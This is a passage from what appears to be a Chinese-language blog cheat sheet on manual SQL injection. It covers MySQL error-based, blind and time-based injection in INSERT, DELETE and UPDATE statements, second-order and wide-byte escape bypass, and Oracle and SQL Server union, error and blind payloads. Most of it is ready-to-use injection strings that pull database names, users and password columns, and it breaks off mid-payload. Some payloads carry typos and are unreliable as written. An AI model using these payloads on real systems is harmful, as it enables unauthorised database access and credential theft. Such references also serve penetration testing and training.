class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mysql&gt; insert into admin (id,username,password) values (<span class="hljs-number">2</span>,&quot;or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(version())),<span class="hljs-number">0</span>) or&quot;,&quot;admin&quot;);<br>Query OK, <span class="hljs-number">1</span> row affected (<span class="hljs-number">0</span>.<span class="hljs-number">00</span> sec)<br><br>mysql&gt; select * from admin;<br>+------+-----------------------------------------------+----------+<br>| id   | username                                      | password |<br>+------+-----------------------------------------------+----------+<br>|    <span class="hljs-number">1</span> | admin                                         | admin    |<br>|    <span class="hljs-number">1</span> | and <span class="hljs-number">1</span>=<span class="hljs-number">1</span>                                       | admin    |<br>|    <span class="hljs-number">2</span> | or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(version())),<span class="hljs-number">0</span>) or | admin    |<br>+------+-----------------------------------------------+----------+<br><span class="hljs-number">3</span> rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (<span class="hljs-number">0</span>.<span class="hljs-number">00</span> sec)<br><br>mysql&gt; insert into admin (id,username,password) values (<span class="hljs-number">2</span>,&quot;&quot;or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(version())),<span class="hljs-number">0</span>) or&quot;&quot;,&quot;admin&quot;);<br>ERROR <span class="hljs-number">1105</span> (HY000): XPATH syntax error: &#x27;~<span class="hljs-number">5</span>.<span class="hljs-number">5</span>.<span class="hljs-number">53</span>&#x27;<br></code></pre></td></tr></table></figure><p>#delete 注入很危险，很危险，很危险，切记不能使用 or 1&#x3D;1 ，or 右边一定要为false</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">-2</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(version())),<span class="hljs-number">0</span>);<br>ERROR <span class="hljs-number">1105</span> (HY000): XPATH syntax error: <span class="hljs-string">&#x27;~5.5.53&#x27;</span><br></code></pre></td></tr></table></figure><p>1.4.2 盲注</p><p>#int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>+<span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;1&#x27;</span>,&quot;admin&quot;);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-keyword">row</span> affected (<span class="hljs-number">5.00</span> sec)<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>+<span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;p&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;1&#x27;</span>,&quot;admin&quot;);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-keyword">row</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>#字符型注意闭合不能使用and</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&#x27;</span>+<span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;p&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;&#x27;</span>,&quot;admin&quot;);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-keyword">row</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&#x27;</span>+<span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;&#x27;</span>,&quot;admin&quot;);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-keyword">row</span> affected (<span class="hljs-number">5.01</span> sec)<br></code></pre></td></tr></table></figure><p>delete 函数 or 右边一定要为 false</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">where</span> id =<span class="hljs-number">-2</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r4&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">where</span> id =<span class="hljs-number">-2</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">5.00</span> sec)<br></code></pre></td></tr></table></figure><p>#update 更新数据内容</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select * from admin;</span><br><span class="hljs-section">+------+----------+----------+</span><br><span class="hljs-section">| id   | username | password |</span><br><span class="hljs-section">+------+----------+----------+</span><br>|    2 | 1        | admin    |<br>|    2 | 1        | admin    |<br>|    2 | 1        | admin    |<br><span class="hljs-section">|    2 | admin    | admin    |</span><br><span class="hljs-section">+------+----------+----------+</span><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span>&gt; update admin set id=<span class="hljs-string">&quot;5&quot;</span>+sleep(<span class="hljs-number">5</span>)+<span class="hljs-string">&quot;&quot;</span> where id=<span class="hljs-number">2</span>;<br><span class="hljs-attribute">Query</span> OK, <span class="hljs-number">4</span> rows affected (<span class="hljs-number">20</span>.<span class="hljs-number">00</span> sec)<br><span class="hljs-attribute">Rows</span> matched: <span class="hljs-number">4</span>  Changed: <span class="hljs-number">4</span>  Warnings: <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="1-5-二次注入与宽字节注入"><a href="#1-5-二次注入与宽字节注入" class="headerlink" title="1.5 二次注入与宽字节注入"></a>1.5 二次注入与宽字节注入</h3><p>二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码他，这样就不会带有单引号等。</p><p>mysql&gt; insert into admin (id,name,pass) values (‘3’,0x61646d696e272d2d2b,’11’);<br>Query OK, 1 row affected (0.00 sec)</p><p>mysql&gt; select * from admin;<br>+—-+———–+——-+<br>| id | name      | pass  |<br>+—-+———–+——-+<br>|  1 | admin     | admin |<br>|  2 | admin’111 | 11111 |<br>|  3 | admin’–+ | 11    |<br>+—-+———–+——-+<br>4 rows in set (0.00 sec)<br>二次注入在没有源码的情况比较难发现，通常见于注册，登录恶意账户后，数据库可能会因为恶意账户名的问题，将 admin’–+ 误认为 admin 账户</p><p>宽字节注入：针对目标做了一定的防护，单引号转变为 &#39; , mysql 会将 \ 编码为 %5c ，宽字节中两个字节代表一个汉字，所以把 %df 加上 %5c 就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入<br>id&#x3D;-1%df’ union select…</p><p><strong>没使用宽字节</strong><br>%27 -&gt; %5C%27</p><p><strong>使用宽字节</strong><br>%df%27 -&gt; %df%5c%27 -&gt; 運’</p><h2 id="0x02-Oracle-手工注入"><a href="#0x02-Oracle-手工注入" class="headerlink" title="0x02 Oracle 手工注入"></a>0x02 Oracle 手工注入</h2><h3 id="2-1-联合注入"><a href="#2-1-联合注入" class="headerlink" title="2.1 联合注入"></a>2.1 联合注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select user,null from dual--</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> version,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> v$instance<span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> column_name,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> rownum <span class="hljs-keyword">as</span> limit,column_name <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> table_name <span class="hljs-operator">=</span><span class="hljs-string">&#x27;USERS&#x27;</span>) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">2</span>)<span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select username,passwd from users--</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,passwd <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> username,passwd,rownum <span class="hljs-keyword">as</span> limit <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">3</span>)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h3 id="2-2-报错注入"><a href="#2-2-报错注入" class="headerlink" title="2.2 报错注入"></a>2.2 报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=ctxsys.drithsx.sn(1,(select user from dual))--</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> v$version <span class="hljs-keyword">where</span> banner <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;Oracle%))--</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> rownum <span class="hljs-keyword">as</span> limit,table_name <span class="hljs-keyword">from</span> user_tables) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span> <span class="hljs-number">3</span>))<span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name =&#x27;</span>USERS<span class="hljs-string">&#x27;) where limit=3))--</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> passwd <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> passwd,rownum <span class="hljs-keyword">as</span> limit <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">1</span>))<span class="hljs-operator">-</span><br></code></pre></td></tr></table></figure><h3 id="2-3-盲注"><a href="#2-3-盲注" class="headerlink" title="2.3 盲注"></a>2.3 盲注</h3><h4 id="2-3-1-布尔盲注"><a href="#2-3-1-布尔盲注" class="headerlink" title="2.3.1 布尔盲注"></a>2.3.1 布尔盲注</h4><p>既然是盲注，那么肯定涉及到条件判断语句，Oracle除了使用IF the else end if这种复杂的，还可以使用 decode() 函数。<br>语法：decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值);</p><p>该函数的含义如下：<br>IF 条件&#x3D;值1 THEN<br>　　　　RETURN(返回值1)<br>ELSIF 条件&#x3D;值2 THEN<br>　　　　RETURN(返回值2)<br>　　　　……<br>ELSIF 条件&#x3D;值n THEN<br>　　　　RETURN(返回值n)<br>ELSE<br>　　　　RETURN(缺省值)<br>END IF<br>?id&#x3D;1’ and 1&#x3D;(select decode(user,’SYSTEM’,1,0,0) from dual)–<br>?id&#x3D;1’ and 1&#x3D;(select decode(substr(user,1,1),’S’,1,0,0) from dual)–<br>?id&#x3D;1’ and ascii(substr(user,1,1))&gt; 64–  #二分法</p><h4 id="2-3-2-时间盲注"><a href="#2-3-2-时间盲注" class="headerlink" title="2.3.2 时间盲注"></a>2.3.2 时间盲注</h4><p>可使用DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)函数进行时间盲注，这个函数可以指定延迟的时间</p><p><code>?id=1&#39; and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(&#39;a&#39;,5) else 1 end)--</code><br><code>?id=1&#39; and 1=(case when ascii(substr(user,1,1))&gt; 64 then DBMS_PIPE.RECEIVE_MESSAGE(&#39;a&#39;,5) else 1 end)--</code></p><h2 id="0x03-SQL-server-手工注入"><a href="#0x03-SQL-server-手工注入" class="headerlink" title="0x03 SQL server 手工注入"></a>0x03 SQL server 手工注入</h2><h3 id="3-1-联合注入"><a href="#3-1-联合注入" class="headerlink" title="3.1 联合注入"></a>3.1 联合注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select null,null--</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@servername</span>, @<span class="hljs-variable">@version</span><span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select db_name(),suser_sname()--</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> sys.databases <span class="hljs-keyword">where</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">6</span> name <span class="hljs-keyword">from</span> sys.databases)),<span class="hljs-keyword">null</span><span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--</span><br><span class="hljs-string">?id--1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> table_ name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">0</span> table_name <span class="hljs-keyword">from</span> information_schema.tables)),<span class="hljs-keyword">null</span><span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select (select top 1 column name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#x27;</span>users<span class="hljs-string">&#x27;)),null---</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">3</span> username <span class="hljs-keyword">from</span> users)),<span class="hljs-keyword">null</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h3 id="3-2-报错注入"><a href="#3-2-报错注入" class="headerlink" title="3.2 报错注入"></a>3.2 报错注入</h3><p><code>?id=1&#39; and 1=(select 1/@@servername)--</code><br><code>?id=1&#39; and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--</code></p><h3 id="3-3-盲注"><a href="#3-3-盲注" class="headerlink" title="3.3 盲注"></a>3.3 盲注</h3><h4 id="3-3-1-布尔盲注"><a href="#3-3-1-布尔盲注" class="headerlink" title="3.3.1 布尔盲注"></a>3.3.1 布尔盲注</h4><p><code>?id=1&#39; and ascii(substring((select db_ name(1)),1,1))&gt; 64--</code></p><h4 id="3-3-2-时间盲注"><a href="#3-3-2-时间盲注" class="headerlink" title="3.3.2 时间盲注"></a>3.3.2 时间盲注</h4><p><code>?id= 1&#39;;if(2&gt;1) waitfor delay &#39;0:0:5&#39;--</code><br><code>?id= 1&#39;;if(ASCII(SUBSTRING((select db_name(1)),1,1))&gt; 64) wai</code></p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>备忘录</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
